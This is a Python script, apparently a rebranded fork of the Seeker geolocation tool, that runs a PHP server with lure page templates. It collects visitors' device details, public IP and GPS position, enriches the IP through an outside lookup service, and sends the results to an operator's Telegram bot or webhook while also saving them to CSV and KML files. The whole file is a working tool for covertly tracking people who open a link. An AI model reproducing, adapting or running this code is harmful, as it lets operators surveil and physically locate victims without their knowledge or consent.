#!/usr/bin/env python3

VERSION = '1.3.2-cyberman'

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'  # white
Y = '\033[33m'  # yellow

import sys
import utils
import argparse
import requests
import traceback
import shutil
from time import sleep
from os import path, kill, mkdir, getenv, environ, remove, devnull
from json import loads, decoder
from packaging import version

# safer defaults / timeouts
REQUEST_TIMEOUT = 6

parser = argparse.ArgumentParser()
parser.add_argument('-k', '--kml', help='KML filename')
parser.add_argument(
    '-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]'
)
parser.add_argument('-u', '--update', action='store_true', help='Check for updates')
parser.add_argument('-v', '--version', action='store_true', help='Prints version')
parser.add_argument(
    '-t',
    '--template',
    type=int,
    help='Load template and loads parameters from env variables',
)
parser.add_argument(
    '-d',
    '--debugHTTP',
    action='store_true',
    help='Disable HTTPS redirection for testing only',
)
parser.add_argument(
    '-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]'
)
parser.add_argument(
    '-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]'
)

args = parser.parse_args()
kml_fname = args.kml

# prefer environment value but ensure integer when possible
_port_env = getenv('PORT')
try:
    port = int(_port_env) if _port_env is not None and str(_port_env).strip() != '' else int(args.port)
except Exception:
    port = args.port

chk_upd = args.update
print_v = args.version
telegram = getenv('TELEGRAM') or args.telegram
webhook = getenv('WEBHOOK') or args.webhook

environ['DEBUG_HTTP'] = '1' if (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP else '0'

templateNum = None
if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric():
    try:
        templateNum = int(getenv('TEMPLATE'))
    except Exception:
        templateNum = args.template
else:
    templateNum = args.template

path_to_script = path.dirname(path.realpath(__file__))

SITE = ''
SERVER_PROC = ''
LOG_DIR = f'{path_to_script}/logs'
DB_DIR = f'{path_to_script}/db'
LOG_FILE = f'{LOG_DIR}/php.log'
DATA_FILE = f'{DB_DIR}/results.csv'
INFO = f'{LOG_DIR}/info.txt'
RESULT = f'{LOG_DIR}/result.txt'
TEMPLATES_JSON = f'{path_to_script}/template/templates.json'
TEMP_KML = f'{path_to_script}/template/sample.kml'
META_FILE = f'{path_to_script}/metadata.json'
# changed "seeker" references to cyberman as requested
META_URL = 'https://raw.githubusercontent.com/cyberman/cyberman/master/metadata.json'
PID_FILE = f'{path_to_script}/pid'

# create necessary dirs safely
for d in (LOG_DIR, DB_DIR):
    try:
        if not path.isdir(d):
            mkdir(d)
    except Exception as e:
        utils.print(f"{R}[-] Cannot create directory {d}: {e}{W}")
        sys.exit(1)


def chk_update():
    try:
        utils.print('> Fetching Metadata...')
        rqst = requests.get(META_URL, timeout=REQUEST_TIMEOUT)
        if rqst.status_code == 200:
            try:
                json_data = loads(rqst.text)
                gh_version = json_data.get('version')
                if gh_version and version.parse(gh_version) > version.parse(VERSION):
                    utils.print(f'> New Update Available : {gh_version}')
                else:
                    utils.print('> Already up to date.')
            except Exception:
                utils.print('> Metadata invalid or missing version field')
        else:
            utils.print(f'> Metadata fetch failed (status {rqst.status_code})')
    except Exception as exc:
        utils.print(f'Exception while checking update : {str(exc)}')


if chk_upd is True:
    chk_update()
    sys.exit()

if print_v is True:
    utils.print(VERSION)
    sys.exit()

import socket
import importlib
from csv import writer
import subprocess as subp
import psutil
from ipaddress import ip_address
from signal import SIGTERM


def banner():
    twitter_url = ''
    comms_url = ''
    try:
        if path.exists(META_FILE):
            with open(META_FILE, 'r') as metadata:
                json_data = loads(metadata.read())
                twitter_url = json_data.get('twitter', '')
                comms_url = json_data.get('comms', '')
    except Exception:
        # non-fatal, just show what we can
        pass

    art = r"""
                       __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
     \/      \/     \/      \/     \/"""
    utils.print(f'{G}{art}{W}\n')
    utils.print(f'{G}[>] {C}Created By   : {W}cyberman')
    if twitter_url:
        utils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')
    if comms_url:
        utils.print(f'{G} |---> {C}Community : {W}{comms_url}')
    utils.print(f'{G}[>] {C}Version      : {W}{VERSION}\n')


def send_webhook(content, msg_type):
    if not webhook:
        return
    if not webhook.lower().startswith(('http://', 'https://')):
        utils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')
        return
    try:
        if webhook.lower().startswith('https://discord.com/api/webhooks'):
            from discord_webhook import discord_sender

            discord_sender(webhook, msg_type, content)
        else:
            requests.post(webhook, json=content, timeout=REQUEST_TIMEOUT)
    except Exception as e:
        utils.print(f'{R}[-] Webhook fail: {e}{W}')


def send_telegram(content, msg_type):
    if not telegram:
        return
    tmpsplit = telegram.split(':')
    if len(tmpsplit) < 2:
        utils.print(f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}')
        return
    try:
        from telegram_api import tgram_sender

        tgram_sender(msg_type, content, tmpsplit)
    except Exception as e:
        utils.print(f'{R}[-] Telegram send failed: {e}{W}')


def template_select(site):
    utils.print(f'{Y}[!] Select a Template :{W}\n')

    if not path.exists(TEMPLATES_JSON):
        utils.print(f'{R}[-] Templates config missing: {TEMPLATES_JSON}{W}')
        sys.exit(1)

    try:
        with open(TEMPLATES_JSON, 'r') as templ:
            templ_json = loads(templ.read())
    except Exception as e:
        utils.print(f'{R}[-] Failed to read templates.json: {e}{W}')
        sys.exit(1)

    templates = templ_json.get('templates', [])
    for idx, item in enumerate(templates):
        name = item.get('name', 'Unknown')
        utils.print(f'{G}[{idx}] {C}{name}{W}')

    try:
        selected = -1
        if templateNum is not None:
            if 0 <= templateNum < len(templates):
                selected = templateNum
        else:
            selected = int(input(f'{G}[>] {W}'))
        if selected < 0:
            utils.print(f'{R}[-] {C}Invalid Input!{W}')
            sys.exit()
    except Exception:
        utils.print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()

    try:
        site = templates[selected].get('dir_name')
    except Exception:
        utils.print(f'{R}[-] {C}Invalid Input!{W}')
        sys.exit()

    utils.print(f'{G}[+] {C}Loading {Y}{templates[selected].get("name")} {C}Template...{W}')

    imp_file = templates[selected].get('import_file')
    try:
        if imp_file:
            importlib.import_module(f'template.{imp_file}')
    except Exception as e:
        utils.print(f'{Y}[!] Warning: could not import template module: {e}{W}')

    try:
        base = f'template/{templates[selected]["dir_name"]}'
        shutil.copyfile('php/error.php', f'{base}/error_handler.php')
        shutil.copyfile('php/info.php', f'{base}/info_handler.php')
        shutil.copyfile('php/result.php', f'{base}/result_handler.php')
        jsdir = f'{base}/js'
        if not path.isdir(jsdir):
            mkdir(jsdir)
        shutil.copyfile('js/location.js', jsdir + '/location.js')
    except Exception as e:
        utils.print(f'{Y}[!] Warning copying template assets: {e}{W}')

    return site


class PHPServerManager:
    def __init__(self, port, site):
        self.port = port
        self.site = site
        self.proc = None

    def is_port_free(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            try:
                sock.connect(('127.0.0.1', self.port))
                return False
            except Exception:
                return True

    def start(self):
        cmd = ['php', '-S', f'0.0.0.0:{self.port}', '-t', f'template/{self.site}/']
        try:
            with open(LOG_FILE, 'w') as phplog:
                self.proc = subp.Popen(cmd, stdout=phplog, stderr=phplog)
            with open(PID_FILE, 'w') as pid_out:
                pid_out.write(str(self.proc.pid))
        except Exception as e:
            utils.print(f'{R}[-] Failed to start PHP server: {e}{W}')
            sys.exit(1)

        # wait briefly and verify
        sleep(2)
        try:
            php_rqst = requests.get(f'http://127.0.0.1:{self.port}/index.html', timeout=REQUEST_TIMEOUT)
            if php_rqst.status_code == 200:
                utils.print(f'{C}[ {G}✔{C} ]{W}')
                utils.print('\n')
            else:
                utils.print(f'{C}[ {R}Status : {php_rqst.status_code}{C} ]{W}')
                self.stop()
                cl_quit()
        except Exception:
            utils.print(f'{C}[ {R}✘{C} ]{W}')
            self.stop()
            cl_quit()

    def stop(self):
        if path.isfile(PID_FILE):
            try:
                with open(PID_FILE, 'r') as pid_info:
                    pid = int(pid_info.read().strip())
                ps_proc = psutil.Process(pid)
                if ps_proc.is_running():
                    ps_proc.terminate()
                    try:
                        ps_proc.wait(timeout=3)
                    except Exception:
                        ps_proc.kill()
            except Exception:
                pass
            try:
                remove(PID_FILE)
            except Exception:
                pass


def server():
    utils.print('\n')
    utils.print(f'{G}[+] {C}Port : {W}{port}\n')
    utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')

    manager = PHPServerManager(port, SITE)

    if not manager.is_port_free():
        if path.exists(PID_FILE):
            try:
                with open(PID_FILE, 'r') as pid_info:
                    pid = int(pid_info.read().strip())
                    old_proc = psutil.Process(pid)
                    utils.print(f'{C}[ {R}✘{C} ]{W}')
                    utils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')
                    utils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')
                    try:
                        if old_proc.is_running():
                            old_proc.terminate()
                            try:
                                old_proc.wait(timeout=2)
                            except Exception:
                                old_proc.kill()
                    except psutil.NoSuchProcess:
                        pass
            except Exception:
                utils.print(f'{C}[ {R}✘{C} ]{W}')
                utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
                sys.exit()
        else:
            utils.print(f'{C}[ {R}✘{C} ]{W}')
            utils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')
            sys.exit()

    manager.start()


def wait():
    printed = False
    try:
        while True:
            sleep(1)
            # ensure result file exists
            if not path.exists(RESULT):
                continue
            try:
                size = path.getsize(RESULT)
            except Exception:
                continue
            if size == 0 and not printed:
                utils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\n')
                printed = True
            if size > 0:
                data_parser()
                printed = False
    except KeyboardInterrupt:
        raise


def safe_load_json_file(fname):
    if not path.exists(fname):
        return None
    try:
        with open(fname, 'r') as fh:
            content = fh.read()
            if not content or content.strip() == '':
                return None
            return loads(content)
    except Exception:
        utils.print(f'{R}[-] {C}Exception reading/parsing {fname} : {traceback.format_exc()}{W}')
        return None


def data_parser():
    data_row = []

    info_json = safe_load_json_file(INFO)
    if not info_json:
        return

    try:
        var_os = info_json.get('os', '')
        var_platform = info_json.get('platform', '')
        var_cores = info_json.get('cores', '')
        var_ram = info_json.get('ram', '')
        var_vendor = info_json.get('vendor', '')
        var_render = info_json.get('render', '')
        var_res = f"{info_json.get('wd','')}x{info_json.get('ht','')}"
        var_browser = info_json.get('browser', '')
        var_ip = info_json.get('ip', '')

        data_row.extend([
            var_os,
            var_platform,
            var_cores,
            var_ram,
            var_vendor,
            var_render,
            var_res,
            var_browser,
            var_ip,
        ])

        device_info = f"""{Y}[!] Device Information :{W}\n\n{G}[+] {C}OS         : {W}{var_os}\n{G}[+] {C}Platform   : {W}{var_platform}\n{G}[+] {C}CPU Cores  : {W}{var_cores}\n{G}[+] {C}RAM        : {W}{var_ram}\n{G}[+] {C}GPU Vendor : {W}{var_vendor}\n{G}[+] {C}GPU        : {W}{var_render}\n{G}[+] {C}Resolution : {W}{var_res}\n{G}[+] {C}Browser    : {W}{var_browser}\n{G}[+] {C}Public IP  : {W}{var_ip}\n"""
        utils.print(device_info)
        send_telegram(info_json, 'device_info')
        send_webhook(info_json, 'device_info')

        if var_ip and not ip_address(var_ip).is_private:
            try:
                rqst = requests.get(f'https://ipwhois.app/json/{var_ip}', timeout=REQUEST_TIMEOUT)
                if rqst.status_code == 200:
                    data = rqst.text
                    try:
                        data = loads(data)
                        var_continent = str(data.get('continent',''))
                        var_country = str(data.get('country',''))
                        var_region = str(data.get('region',''))
                        var_city = str(data.get('city',''))
                        var_org = str(data.get('org',''))
                        var_isp = str(data.get('isp',''))

                        data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
                        ip_info = f"""{Y}[!] IP Information :{W}\n\n{G}[+] {C}Continent : {W}{var_continent}\n{G}[+] {C}Country   : {W}{var_country}\n{G}[+] {C}Region    : {W}{var_region}\n{G}[+] {C}City      : {W}{var_city}\n{G}[+] {C}Org       : {W}{var_org}\n{G}[+] {C}ISP       : {W}{var_isp}\n"""
                        utils.print(ip_info)
                        send_telegram(data, 'ip_info')
                        send_webhook(data, 'ip_info')
                    except Exception:
                        utils.print(f'{Y}[!] IP whois returned invalid JSON{W}')
            except Exception as e:
                utils.print(f'{Y}[!] IP lookup failed: {e}{W}')
        else:
            utils.print(f'{Y}[!] Skipping IP recon because IP address is private or missing{W}')
    except Exception:
        utils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')

    result_json = safe_load_json_file(RESULT)
    if result_json:
        try:
            status = result_json.get('status')
            if status == 'success':
                var_lat = result_json.get('lat','')
                var_lon = result_json.get('lon','')
                var_acc = result_json.get('acc','')
                var_alt = result_json.get('alt','')
                var_dir = result_json.get('dir','')
                var_spd = result_json.get('spd','')

                data_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])
                loc_info = f"""{Y}[!] Location Information :{W}\n\n{G}[+] {C}Latitude  : {W}{var_lat}\n{G}[+] {C}Longitude : {W}{var_lon}\n{G}[+] {C}Accuracy  : {W}{var_acc}\n{G}[+] {C}Altitude  : {W}{var_alt}\n{G}[+] {C}Direction : {W}{var_dir}\n{G}[+] {C}Speed     : {W}{var_spd}\n"""
                utils.print(loc_info)
                send_telegram(result_json, 'location')
                send_webhook(result_json, 'location')

                try:
                    gmaps_url = f'https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}' if var_lat and var_lon else ''
                    if gmaps_url:
                        utils.print(f'{G}[+] {C}Google Maps : {W}{gmaps_url}')
                        send_telegram({'url': gmaps_url}, 'url')
                        send_webhook({'url': gmaps_url}, 'url')
                except Exception:
                    pass

                if kml_fname is not None:
                    try:
                        kmlout(var_lat, var_lon)
                    except Exception as e:
                        utils.print(f'{Y}[!] Failed to write KML: {e}{W}')
            else:
                var_err = result_json.get('error', 'Unknown')
                utils.print(f'{R}[-] {C}{var_err}\n')
                send_telegram(result_json, 'error')
                send_webhook(result_json, 'error')
        except Exception:
            utils.print(f'{R}[-] {C}Exception parsing result: {traceback.format_exc()}{W}')

    csvout(data_row)
    clear()
    return


def kmlout(var_lat, var_lon):
    if not path.exists(TEMP_KML):
        utils.print(f'{Y}[!] KML template missing: {TEMP_KML}{W}')
        return
    try:
        with open(TEMP_KML, 'r') as kml_sample:
            kml_sample_data = kml_sample.read()

        kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
        kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

        outpath = f'{path_to_script}/{kml_fname}.kml'
        with open(outpath, 'w') as kml_gen:
            kml_gen.write(kml_sample_data)

        utils.print(f'{Y}[!] KML File Generated!{W}')
        utils.print(f'{G}[+] {C}Path : {W}{outpath}')
    except Exception as e:
        utils.print(f'{Y}[!] KML write error: {e}{W}')


def csvout(row):
    try:
        with open(DATA_FILE, 'a') as csvfile:
            csvwriter = writer(csvfile)
            csvwriter.writerow(row)
        utils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\n')
    except Exception as e:
        utils.print(f'{R}[-] Failed to write CSV: {e}{W}')


def clear():
    try:
        open(RESULT, 'w').close()
        open(INFO, 'w').close()
    except Exception:
        pass


def repeat():
    clear()
    wait()


def cl_quit():
    try:
        if not path.isfile(PID_FILE):
            return
        with open(PID_FILE, 'r') as pid_info:
            pid = int(pid_info.read().strip())
            try:
                kill(pid, SIGTERM)
            except Exception:
                try:
                    psutil.Process(pid).terminate()
                except Exception:
                    pass
        try:
            remove(PID_FILE)
        except Exception:
            pass
    finally:
        sys.exit()


if __name__ == '__main__':
    try:
        banner()
        clear()
        SITE = template_select(SITE)
        server()
        wait()
        data_parser()
    except KeyboardInterrupt:
        utils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')
        cl_quit()
    except Exception:
        utils.print(f'{R}[-] Fatal Exception: {traceback.format_exc()}{W}')
        try:
            cl_quit()
        except SystemExit:
            pass
    else:
        repeat()
